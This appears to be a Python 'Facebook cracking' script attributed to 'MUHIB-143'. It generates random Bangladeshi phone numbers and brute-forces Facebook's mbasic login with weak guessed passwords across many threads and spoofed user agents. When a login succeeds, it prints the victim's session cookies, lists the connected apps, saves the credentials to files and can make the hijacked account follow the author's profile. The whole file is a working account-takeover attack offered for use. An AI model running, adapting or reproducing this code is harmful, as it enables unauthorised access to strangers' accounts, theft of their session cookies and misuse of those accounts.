import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s-->%s] %s JUST LOGIN %s  '%(N,M,N,M,N))
    else:
        print(f'\r[🫡] %s \x1b[1;95m  ACTIVITIES ××=     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s-->%s] %s NO ACTIVITIES %s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🫡] %s \x1b[1;95m  ACTIVITIES ××=    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(' LOGIN AFTER 7 DAYS PLEASE')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/its.muhib.7/')
logo =("""\033[0;92m  ███    ███[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██████ 
  [1;92m████  ████[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
  [1;92m██ ████ ██[1;93m ██      ██[1;97m ███████[1;91m ██[1;92m ██████   
  [1;92m██  ██  ██[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
  [1;92m██      ██[1;93m ██████████[1;97m ██   ██[1;91m ██[1;92m ██████
[1;97m->->->->->->->->->->->->->->->->->->->->->->->[1;92m
[1;91m -->  [1;92mDEVOLPER   :          MUHIB-143 
[1;91m -->  [1;92mFACEBOOK   :          MUHIB-143 
[1;91m -->  [1;92mGITHUB     :          MUHIB-143
[1;91m -->  [1;92mTOOLS      :          FACEBOOK CRACKING
[1;97m->->->->->->->->->->->->->->->->->->->->->->->
    """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    e=random.randrange(1, 999)
    f=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan(' \033[1;97m->->->->->->->->->->->->->->->->->->->->->->->')
    jalan(' \033[1;91m-\033[1;91m-\033[1;91m>\033[1;32m BD SIM :   \033[1;92m+88018(0~9) \033[1;32m+88017(0~9) \033[1;92m+88016(0~9) \033[1;92m+88019(0~9)')
    jalan(' \033[1;97m->->->->->->->->->->->->->->->->->->->->->->->')
    jalan(' \033[1;97m-\033[1;97m EXAMPLE : 0172  | 0197 exc')
    code = input(' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m CHOOSE YOUR COUNTRY CODE :\033[1;37m ')
    os.system('xdg-open https://www.facebook.com/its.muhib.7')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;91m-{xr}-{x}>\033[0;92m CHOICE LIMIT : \033[0;97m10000, \x1b[1;92m50000[BEST],\033[0;97m100000] \n\033[0;92m->->->->->->->->->->->->->->->->->->->->->->->\n\033[0;91m-{xr}-{x}> \033[0;92mENTER CLONING LIMIT :\033[0;92m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        jalan('\033[1;97m->->->->->->->->->->->->->->->->->->->->->->->')
        jalan(f'-{xr}-{x}> \033[1;92mYOUR PUT CODE : \033[1;97m'+code)
        jalan(f'-{xr}-{x}> \033[1;92mYOUR TOTAL IDS: \033[1;97m'+tl)
        jalan(f'{x}-{xr}-{x}> \033[1;92mYOUR IP ADDRESS : \033[1;97m'+ip)
        jalan(f'\033[0;97m-{xr}-{x}> \x1b[1;92mAIR PLAN MODE FOR SPEED')
        jalan('\033[1;97m->->->->->->->->->->->->->->->->->->->->->->->')
        for love in user:
            pwx = [(code+love), (pow), (love), ("bangladesh")]
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
           # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=1000&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[MUHIB-OK🩶] \033[1;92m'+cid+'\033[1;91m --> \033[1;92m' +ps+    '  \n[‎‎🖕]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;92m')
                cek_apk(session,coki)
                open('/sdcard/Muhib -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\33[1;90m[XOXX-CP] ' +uid+'\033[1;30m --> \033[0;90m' +ps+ ' \n')
                open('/sdcard/Muhib -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MUHIB-143{x}][%s ~ %s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
